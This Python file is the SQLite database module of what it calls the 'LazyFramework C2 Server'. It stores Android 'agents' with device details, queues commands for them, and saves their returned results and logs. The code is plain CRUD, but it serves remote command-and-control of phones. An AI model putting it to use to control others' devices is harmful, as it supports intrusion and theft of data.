#!/usr/bin/env python3
"""
Database module untuk LazyFramework C2 Server
"""

import sqlite3
import json
import datetime
from config import DATABASE
import threading

db_lock = threading.Lock()

def get_connection():
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT UNIQUE NOT NULL,
                device TEXT,
                android_version TEXT,
                manufacturer TEXT,
                last_seen TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command TEXT NOT NULL,
                status TEXT DEFAULT 'pending',
                sent_at TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT NOT NULL,
                command_id INTEGER,
                command TEXT NOT NULL,
                result TEXT,
                result_size INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (agent_id) REFERENCES agents(agent_id),
                FOREIGN KEY (command_id) REFERENCES commands(id)
            )
        ''')
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                agent_id TEXT,
                level TEXT,
                message TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_agents_agent_id ON agents(agent_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_agent_id ON commands(agent_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_results_agent_id ON results(agent_id)')
        cursor.execute('CREATE INDEX IF NOT EXISTS idx_logs_agent_id ON logs(agent_id)')
        
        conn.commit()
        conn.close()

def save_agent(agent_id, device=None, android_version=None, manufacturer=None, last_seen=None):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        last_seen = last_seen or datetime.datetime.now()
        
        cursor.execute('''
            INSERT OR REPLACE INTO agents 
            (agent_id, device, android_version, manufacturer, last_seen)
            VALUES (?, ?, ?, ?, ?)
        ''', (agent_id, device, android_version, manufacturer, last_seen))
        
        conn.commit()
        conn.close()

def save_command(agent_id=None, command=None, status=None, cmd_id=None):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        
        if cmd_id:
            cursor.execute('UPDATE commands SET status = ? WHERE id = ?', (status, cmd_id))
        else:
            cursor.execute('''
                INSERT INTO commands (agent_id, command, status, created_at)
                VALUES (?, ?, ?, ?)
            ''', (agent_id, command, status or 'pending', datetime.datetime.now()))
            cmd_id = cursor.lastrowid
        
        conn.commit()
        conn.close()
        return cmd_id

def save_result(agent_id, command, result, command_id=None, timestamp=None):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        timestamp = timestamp or datetime.datetime.now()
        result_size = len(result) if isinstance(result, str) else len(json.dumps(result))
        
        cursor.execute('''
            INSERT INTO results 
            (agent_id, command_id, command, result, result_size, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (agent_id, command_id, command, result, result_size, timestamp))
        
        conn.commit()
        conn.close()

def get_agents(limit=100):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('''
            SELECT agent_id, device, android_version, manufacturer, last_seen, created_at
            FROM agents ORDER BY last_seen DESC LIMIT ?
        ''', (limit,))
        rows = cursor.fetchall()
        conn.close()
        
        agents_list = []
        for row in rows:
            agents_list.append({
                'agent_id': row['agent_id'],
                'device': row['device'],
                'android_version': row['android_version'],
                'manufacturer': row['manufacturer'],
                'last_seen': row['last_seen'],
                'created_at': row['created_at']
            })
        return agents_list

def get_agent(agent_id):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM agents WHERE agent_id = ?', (agent_id,))
        row = cursor.fetchone()
        conn.close()
        if row:
            return dict(row)
        return None

def get_commands(agent_id=None, status=None, limit=100):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        query = 'SELECT id, agent_id, command, status, sent_at, created_at FROM commands WHERE 1=1'
        params = []
        if agent_id:
            query += ' AND agent_id = ?'
            params.append(agent_id)
        if status:
            query += ' AND status = ?'
            params.append(status)
        query += ' ORDER BY created_at DESC LIMIT ?'
        params.append(limit)
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        return [dict(row) for row in rows]

def get_results(agent_id=None, command=None, limit=100):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        query = 'SELECT id, agent_id, command_id, command, result, result_size, created_at FROM results WHERE 1=1'
        params = []
        if agent_id:
            query += ' AND agent_id = ?'
            params.append(agent_id)
        if command:
            query += ' AND command = ?'
            params.append(command)
        query += ' ORDER BY created_at DESC LIMIT ?'
        params.append(limit)
        cursor.execute(query, params)
        rows = cursor.fetchall()
        conn.close()
        
        results_list = []
        for row in rows:
            try:
                result_data = json.loads(row['result']) if row['result'] else None
            except:
                result_data = row['result']
            results_list.append({
                'id': row['id'],
                'agent_id': row['agent_id'],
                'command_id': row['command_id'],
                'command': row['command'],
                'result': result_data,
                'result_size': row['result_size'],
                'created_at': row['created_at']
            })
        return results_list

def delete_old_results(days=30):
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        cutoff_date = datetime.datetime.now() - datetime.timedelta(days=days)
        cursor.execute('DELETE FROM results WHERE created_at < ?', (cutoff_date,))
        conn.commit()
        conn.close()

def get_stats():
    with db_lock:
        conn = get_connection()
        cursor = conn.cursor()
        cursor.execute('SELECT COUNT(*) as count FROM agents')
        agent_count = cursor.fetchone()['count']
        cursor.execute('SELECT COUNT(*) as count FROM commands WHERE status = "pending"')
        pending_count = cursor.fetchone()['count']
        cursor.execute('SELECT COUNT(*) as count FROM results')
        result_count = cursor.fetchone()['count']
        conn.close()
        return {'agents': agent_count, 'pending_commands': pending_count, 'results': result_count}
